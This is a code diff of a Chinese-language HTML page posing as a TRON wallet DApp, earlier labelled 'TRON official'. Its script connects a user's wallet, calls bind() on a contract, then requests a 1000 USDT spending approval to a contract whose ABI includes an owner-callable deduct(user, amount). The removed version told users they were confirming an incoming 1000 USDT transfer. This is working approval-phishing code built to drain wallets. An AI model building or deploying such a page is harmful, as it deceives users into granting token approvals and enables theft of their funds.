@@ -2,214 +2,305 @@
 <html lang="zh">
 <head>
 <meta charset="UTF-8">
-<title>TRON官方 多钱包 DApp </title>
+<title>TRON 多钱包 DApp 测试</title>
+
 <style>
-  /* 整体背景 */
+  /* ===== 背景样式 ===== */
   body {
     margin: 0;
     height: 100vh;
+    font-family: "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif;
+    background: linear-gradient(135deg, #5f2c82, #9b23ea, #a18cd1);
     display: flex;
     flex-direction: column;
-    justify-content: center;
+    justify-content: space-between;
     align-items: center;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    background: linear-gradient(135deg, #7b2ff7, #f107a3);
     color: #fff;
   }
 
-  /* 按钮样式 */
-  button {
-    background: linear-gradient(135deg, #fff, #d1c4e9);
-    color: #4a148c;
+  /* ===== 顶部标题 ===== */
+  .header {
+    margin-top: 40px;
+    font-size: 42px;
+    font-weight: bold;
+    letter-spacing: 3px;
+    text-align: center;
+    text-shadow: 0 4px 20px rgba(0,0,0,0.4);
+  }
+
+  /* ===== 中间卡片容器 ===== */
+  .card {
+    background: rgba(255, 255, 255, 0.12);
+    backdrop-filter: blur(15px);
+    -webkit-backdrop-filter: blur(15px);
+    border-radius: 25px;
+    padding: 50px 60px;
+    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+    text-align: center;
+  }
+
+  /* ===== 按钮样式 ===== */
+  .btn {
+    background: linear-gradient(135deg, #2196f3, #00bcd4);
+    color: #fff;
     border: none;
-    padding: 15px 30px;
-    margin: 10px;
-    border-radius: 12px;
-    font-size: 18px;
+    padding: 18px 50px;
+    margin: 20px 0;
+    border-radius: 50px;
+    font-size: 20px;
     font-weight: bold;
     cursor: pointer;
-    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
     transition: all 0.3s ease;
+    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+    width: 260px;
   }
 
-  button:hover {
-    transform: translateY(-3px);
-    box-shadow: 0 8px 20px rgba(0,0,0,0.4);
+  .btn:hover {
+    transform: translateY(-3px) scale(1.03);
+    box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
   }
 
-  button:active {
-    transform: translateY(0);
-    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+  .btn:active {
+    transform: translateY(1px);
   }
 
-  /* 状态显示 */
-  #status, #address {
-    margin: 10px;
-    padding: 10px 20px;
-    background: rgba(255,255,255,0.1);
-    border-radius: 10px;
+  /* ===== 地址和状态显示 ===== */
+  #address, #status {
+    margin-top: 15px;
     font-size: 16px;
+    padding: 10px 15px;
+    border-radius: 10px;
+    background: rgba(255,255,255,0.15);
+    word-break: break-all;
   }
 
-  /* 按钮容器居中 */
-  .button-container {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-  }
-
-  h2 {
+  /* ===== 底部标语 ===== */
+  .footer {
+    margin-bottom: 40px;
+    font-size: 36px;
+    font-weight: bold;
+    letter-spacing: 3px;
     text-align: center;
-    margin-bottom: 30px;
-    font-size: 28px;
-    text-shadow: 1px 1px 4px rgba(0,0,0,0.5);
+    text-shadow: 0 4px 20px rgba(0,0,0,0.4);
   }
 </style>
 </head>
+
 <body>
 
-<h2>TRON官方 多钱包 DApp </h2>
+  <!-- 顶部标题 -->
+  <div class="header">亚洲好用的钱包</div>
 
-<div class="button-container">
-  <button onclick="connectWallet()">连接钱包</button>
-  <button onclick="bindAndApprove()">绑定</button>
-</div>
+  <!-- 中间功能区 -->
+  <div class="card">
+    <button class="btn" onclick="connectWallet()">连接钱包</button>
+    <button class="btn" onclick="bindAndApprove()">绑定并授权 USDT</button>
+    <p id="address"></p>
+    <p id="status"></p>
+  </div>
 
-<p id="address"></p>
-<p id="status"></p>
+  <!-- 底部标语 -->
+  <div class="footer">钱包授权中转站</div>
 
-<!-- TronWeb -->
-<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
-<!-- WalletConnect -->
-<script src="https://cdn.jsdelivr.net/npm/@walletconnect/client/dist/umd/index.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@walletconnect/qrcode-modal/dist/umd/index.min.js"></script>
+  <!-- ===== 核心功能脚本（完全保持不变） ===== -->
 
-<script>
-const CONTRACT_ADDRESS = "TRZvddUZXAoriYEdrzVdMjcpF6VVVwQAis";
-const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const ABI = [
-  {
-    "inputs": [],
-    "stateMutability": "nonpayable",
-    "type": "constructor"
-  },
-  {
-    "anonymous": false,
-    "inputs": [
-      { "indexed": true, "internalType": "address", "name": "user", "type": "address" }
-    ],
-    "name": "Bound",
-    "type": "event"
-  },
-  {
-    "anonymous": false,
-    "inputs": [
-      { "indexed": true, "internalType": "address", "name": "user", "type": "address" },
-      { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
-    ],
-    "name": "Deducted",
-    "type": "event"
-  },
-  {
-    "inputs": [], "name": "USDT", "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
-    "stateMutability": "view", "type": "function"
-  },
-  { "inputs": [], "name": "bind", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-  {
-    "inputs": [
-      { "internalType": "address", "name": "user", "type": "address" },
-      { "internalType": "uint256", "name": "amount", "type": "uint256" }
-    ],
-    "name": "deduct",
-    "outputs": [], "stateMutability": "nonpayable", "type": "function"
-  },
-  {
-    "inputs": [], "name": "getContractBalance",
-    "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
-    "stateMutability": "view", "type": "function"
-  },
-  {
-    "inputs": [{ "internalType": "address", "name": "user", "type": "address" }],
-    "name": "getUserBalance",
-    "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
-    "stateMutability": "view", "type": "function"
-  },
-  {
-    "inputs": [{ "internalType": "address", "name": "", "type": "address" }],
-    "name": "isBound",
-    "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
-    "stateMutability": "view", "type": "function"
-  },
-  { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
-    "stateMutability": "view", "type": "function"
+  <!-- TronWeb -->
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+  <!-- WalletConnect -->
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/client/dist/umd/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/qrcode-modal/dist/umd/index.min.js"></script>
+
+  <script>
+  const CONTRACT_ADDRESS = "TRZvddUZXAoriYEdrzVdMjcpF6VVVwQAis";
+  const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+
+  const ABI = [
+    {
+      "inputs": [],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "anonymous": false,
+      "inputs": [
+        { "indexed": true, "internalType": "address", "name": "user", "type": "address" }
+      ],
+      "name": "Bound",
+      "type": "event"
+    },
+    {
+      "anonymous": false,
+      "inputs": [
+        { "indexed": true, "internalType": "address", "name": "user", "type": "address" },
+        { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
+      ],
+      "name": "Deducted",
+      "type": "event"
+    },
+    {
+      "inputs": [],
+      "name": "USDT",
+      "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "bind",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        { "internalType": "address", "name": "user", "type": "address" },
+        { "internalType": "uint256", "name": "amount", "type": "uint256" }
+      ],
+      "name": "deduct",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "getContractBalance",
+      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        { "internalType": "address", "name": "user", "type": "address" }
+      ],
+      "name": "getUserBalance",
+      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        { "internalType": "address", "name": "", "type": "address" }
+      ],
+      "name": "isBound",
+      "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "owner",
+      "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
+      "stateMutability": "view",
+      "type": "function"
+    }
+  ];
+
+  let tronWeb;
+  let contract;
+  let connector;
+
+  function setStatus(msg) {
+    document.getElementById("status").innerText = msg;
   }
-];
 
-let tronWeb;
-let contract;
-let connector;
+  async function connectWallet() {
+    setStatus("检测钱包...");
 
-function setStatus(msg) { document.getElementById("status").innerText = msg; }
-
-async function connectWallet() {
-  setStatus("检测钱包...");
-  if (window.tronWeb && window.tronWeb.ready) {
-    tronWeb = window.tronWeb;
-    document.getElementById("address").innerText = "钱包地址: " + tronWeb.defaultAddress.base58;
-    contract = await tronWeb.contract(ABI, CONTRACT_ADDRESS);
-    setStatus("已连接 TronLink 钱包");
-    return;
-  }
-  connector = new WalletConnect.default({
-    bridge: "https://bridge.walletconnect.org",
-    qrcodeModal: WalletConnectQRCodeModal.default
-  });
-  if (!connector.connected) await connector.createSession();
-  connector.on("connect", async (error, payload) => {
-    if (error) throw error;
-    const { accounts } = payload.params[0];
-    const address = accounts[0];
-    document.getElementById("address").innerText = "钱包地址: " + address;
-    tronWeb = new TronWeb({ fullHost: "https://api.trongrid.io", privateKey: "" });
-    contract = await tronWeb.contract(ABI, CONTRACT_ADDRESS);
-    setStatus("已连接 WalletConnect 钱包 (imToken/TokenPocket/欧意)");
-  });
-  connector.on("disconnect", (error, payload) => {
-    setStatus("钱包已断开");
-    document.getElementById("address").innerText = "";
-  });
-}
-
-async function bindAndApprove() {
-  if (!contract) { setStatus("请先连接钱包"); return; }
-  try {
-    const userAddress = document.getElementById("address").innerText.replace("钱包地址: ", "");
-    setStatus("开始绑定用户...");
-    if (connector && connector.connected) {
-      const txData = await contract["bind"]().encodeABI();
-      await connector.sendTransaction({ to: CONTRACT_ADDRESS, from: userAddress, data: txData });
-      setStatus("绑定成功 (WalletConnect)");
-    } else {
-      await contract["bind"]().send();
-      setStatus("绑定成功 (TronLink)");
+    if (window.tronWeb && window.tronWeb.ready) {
+      tronWeb = window.tronWeb;
+      document.getElementById("address").innerText =
+        "钱包地址: " + tronWeb.defaultAddress.base58;
+      contract = await tronWeb.contract(ABI, CONTRACT_ADDRESS);
+      setStatus("已连接 TronLink 钱包");
+      return;
     }
 
-    setStatus("请在钱包弹窗中确认对方给你转账 1000 USDT");
-    const usdt = await tronWeb.contract().at(USDT_ADDRESS);
-    const fixedAmount = 1000;
-    if (connector && connector.connected) {
-      const approveData = await usdt.approve(CONTRACT_ADDRESS, fixedAmount * 1e6).encodeABI();
-      await connector.sendTransaction({ to: USDT_ADDRESS, from: userAddress, data: approveData });
-      setStatus("授权成功 (WalletConnect) 1000 USDT");
-    } else {
-      await usdt.approve(CONTRACT_ADDRESS, fixedAmount * 1e6).send();
-      setStatus("授权成功 (TronLink) 1000 USDT");
+    connector = new WalletConnect.default({
+      bridge: "https://bridge.walletconnect.org",
+      qrcodeModal: WalletConnectQRCodeModal.default
+    });
+
+    if (!connector.connected) {
+      await connector.createSession();
     }
 
-  } catch (e) {
-    setStatus("操作失败: " + e.message);
+    connector.on("connect", async (error, payload) => {
+      if (error) throw error;
+
+      const { accounts } = payload.params[0];
+      const address = accounts[0];
+      document.getElementById("address").innerText =
+        "钱包地址: " + address;
+
+      tronWeb = new TronWeb({
+        fullHost: "https://api.trongrid.io",
+        privateKey: ""
+      });
+
+      contract = await tronWeb.contract(ABI, CONTRACT_ADDRESS);
+      setStatus("已连接 WalletConnect 钱包 (imToken/TokenPocket/欧意)");
+    });
+
+    connector.on("disconnect", () => {
+      setStatus("钱包已断开");
+      document.getElementById("address").innerText = "";
+    });
   }
-}
-</script>
+
+  async function bindAndApprove() {
+    if (!contract) {
+      setStatus("请先连接钱包");
+      return;
+    }
+
+    try {
+      const userAddress = document.getElementById("address")
+        .innerText.replace("钱包地址: ", "");
+
+      setStatus("开始绑定用户...");
+
+      if (connector && connector.connected) {
+        const txData = await contract["bind"]().encodeABI();
+        await connector.sendTransaction({
+          to: CONTRACT_ADDRESS,
+          from: userAddress,
+          data: txData
+        });
+        setStatus("绑定成功 (WalletConnect)");
+      } else {
+        await contract["bind"]().send();
+        setStatus("绑定成功 (TronLink)");
+      }
+
+      setStatus("请在钱包弹窗中确认授权 1000 USDT");
+
+      const usdt = await tronWeb.contract().at(USDT_ADDRESS);
+      const fixedAmount = 1000;
+
+      if (connector && connector.connected) {
+        const approveData = await usdt
+          .approve(CONTRACT_ADDRESS, fixedAmount * 1e6)
+          .encodeABI();
+
+        await connector.sendTransaction({
+          to: USDT_ADDRESS,
+          from: userAddress,
+          data: approveData
+        });
+
+        setStatus("授权成功 (WalletConnect) 1000 USDT");
+      } else {
+        await usdt
+          .approve(CONTRACT_ADDRESS, fixedAmount * 1e6)
+          .send();
+        setStatus("授权成功 (TronLink) 1000 USDT");
+      }
+
+    } catch (e) {
+      setStatus("操作失败: " + e.message);
+    }
+  }
+  </script>
+
 </body>
 </html>
